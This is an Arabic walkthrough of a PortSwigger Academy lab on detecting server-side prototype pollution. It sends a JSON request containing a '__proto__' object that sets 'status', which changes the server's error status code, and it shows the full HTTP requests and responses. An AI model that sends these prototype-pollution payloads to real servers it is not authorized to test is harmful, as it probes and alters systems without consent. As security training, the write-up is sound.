# [Detecting server-side prototype pollution without polluted property reflection](https://portswigger.net/web-security/prototype-pollution/server-side/lab-detecting-server-side-prototype-pollution-without-polluted-property-reflection)

## **`الهدف`**
قم بالتأكد من وجود الثغرة عن طريقة تلويث `Object.prototype` بطريقة تُحدث تغييرًا ملحوظًا، ولكن غير مُتلف، في سلوك السيرفر.
## **`خطوات الحل`**
==**`ملاحظة هامة:`**== يمكن حل هذا اللاب عن طريق`Status code override` أو `JSON spaces override` أو `Charset override` ولكني سأستعمل الطريقة الأولي هنا.

سنقوم بتسجيل الدخول إلى حساب `wiener:peter` وبعد ذلك سنقوم بتغيير أى جزء من الـ `Billing and Delivery Address` ونضغط `Submit` وبعد ذلك سنقوم بالعثور على الطلب الخاص بهذا الجزء في `HTTP history` ونقوم بتحويله إلى `Repeater`
```http
POST /my-account/change-address HTTP/2
Host: 0ac000e10337542180b1c6bb008e00bc.web-security-academy.net
Cookie: session=rSG7KSeWsZYxGjW48SMVE9pz214GX7xe

{"address_line_1":"TEST","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"rSG7KSeWsZYxGjW48SMVE9pz214GX7xe"}
```

وعند فحص الاستجابة سنجد أن السيرفر يرد بـ `JSON` يمثل المستخدم الخاص بنا.
```http
HTTP/2 200 OK
X-Powered-By: Express
Cache-Control: no-store
Content-Type: application/json; charset=utf-8
Etag: W/"c0-wwwycOX3bwcfudlvhgc2EcxaN4Y"
Date: Tue, 03 Nov 2026 01:50:11 GMT
Keep-Alive: timeout=5
X-Frame-Options: SAMEORIGIN
Content-Length: 192

{"username":"wiener","firstname":"Peter","lastname":"Wiener","address_line_1":"TEST","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","isAdmin":false}
```

بعد ذلك سنقوم بتعديل الطلب عن طريق وضع خاصية جديدة في `JSON` باسم `__proto__`
```http
POST /my-account/change-address HTTP/2
Host: 0ac000e10337542180b1c6bb008e00bc.web-security-academy.net
Cookie: session=rSG7KSeWsZYxGjW48SMVE9pz214GX7xe

{"address_line_1":"TEST","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"rSG7KSeWsZYxGjW48SMVE9pz214GX7xe",
"__proto__": {
    "test1":"test2"
}}
```

ولكن سنجد أن الاستجابة لا تعكس القيمة التي قمنا بإدخالها ولكن هذا لا يعنى أن الموقع غير مصاب بثغرة تلوث النموذ الأولي
```http
HTTP/2 200 OK
X-Powered-By: Express
Cache-Control: no-store
Content-Type: application/json; charset=utf-8
Etag: W/"c0-wwwycOX3bwcfudlvhgc2EcxaN4Y"
Date: Tue, 03 Nov 2026 01:49:59 GMT
Keep-Alive: timeout=5
X-Frame-Options: SAMEORIGIN
Content-Length: 192

{"username":"wiener","firstname":"Peter","lastname":"Wiener","address_line_1":"TEST","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","isAdmin":false}
```

بعد ذلك سنقوم بالتسبب فى حدوث خطأ عن طريق كسر الـ `syntax` كمثال، عن طريق حذف إحدى الفواصل في `JSON`
```http
POST /my-account/change-address HTTP/2
Host: 0ac000e10337542180b1c6bb008e00bc.web-security-academy.net
Cookie: session=rSG7KSeWsZYxGjW48SMVE9pz214GX7xe

{"address_line_1":"TEST","address_line_2":"One Wiener Way","city":"Wienerville""postcode":"BU1 1RP","country":"UK","sessionId":"rSG7KSeWsZYxGjW48SMVE9pz214GX7xe"}
```

وسنجد أنه على الرغم من أن الاستجابة هي `500` إلا أنها تحتوي على خاصية `status`  بقيمة `400`
```http
HTTP/2 500 Internal Server Error
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Etag: W/"15d-CL+bRNak3hmHni3L0mGP5eAnfkg"
Date: Tue, 03 Nov 2026 01:50:16 GMT
Keep-Alive: timeout=5
X-Frame-Options: SAMEORIGIN
Content-Length: 349

{"error":{"expose":true,"statusCode":400,"status":400,"body":"{\"address_line_1\":\"TEST\",\"address_line_2\":\"One Wiener Way\",\"city\":\"Wienerville\",\"postcode\":\"BU1 1RP\",\"country\":\"UK\"\"sessionId\":\"rSG7KSeWsZYxGjW48SMVE9pz214GX7xe\",\r\n\"__proto__\": {\r\n    \"test1\":\"test2\"\r\n}}","type":"entity.parse.failed","test1":"test2"}}
```

 لذلك سنقوم بتعديل الطلب عن طريق وضع خاصية جديدة في `JSON` باسم `__proto__` تحتوي على خاصية `status` بأي قيمة بين `400-599`
 ```http
 POST /my-account/change-address HTTP/2
Host: 0ac000e10337542180b1c6bb008e00bc.web-security-academy.net
Cookie: session=rSG7KSeWsZYxGjW48SMVE9pz214GX7xe
Content-Length: 203

{"address_line_1":"TEST","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"rSG7KSeWsZYxGjW48SMVE9pz214GX7xe",
"__proto__": {
    "status":"500"
}}
 ```
وسنجد أن الاستجابة طبيعية ولكن بعد ذلك سنكرر إرسال الطلب الذي استعملناه لإحداث خطأ عن طريق كسر الـ `syntax`

وسنجد أن قيمة خاصية `status`  و `statusCode` تغيرت للقيمة التي قمنا بوضعها فى الطلب السابق لننتهي من حل اللاب
```http
HTTP/2 500 Internal Server Error
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Etag: W/"15e-esgG2kzt+v0yZrc4pfyru+2s8TY"
Date: Tue, 03 Nov 2026 01:51:22 GMT
Keep-Alive: timeout=5
X-Frame-Options: SAMEORIGIN
Content-Length: 350

{"error":{"expose":false,"statusCode":500,"status":500,"body":"{\"address_line_1\":\"TEST\",\"address_line_2\":\"One Wiener Way\",\"city\":\"Wienerville\",\"postcode\":\"BU1 1RP\",\"country\":\"UK\"\"sessionId\":\"rSG7KSeWsZYxGjW48SMVE9pz214GX7xe\",\r\n\"__proto__\": {\r\n    \"test1\":\"test2\"\r\n}}","type":"entity.parse.failed","test1":"test2"}}
```
## **`ترقيع الثغرة`**
**`نفس ترقيع لاب` [Privilege escalation via server-side prototype pollution](./Privilege-escalation-via-server-side-prototype-pollution.md)
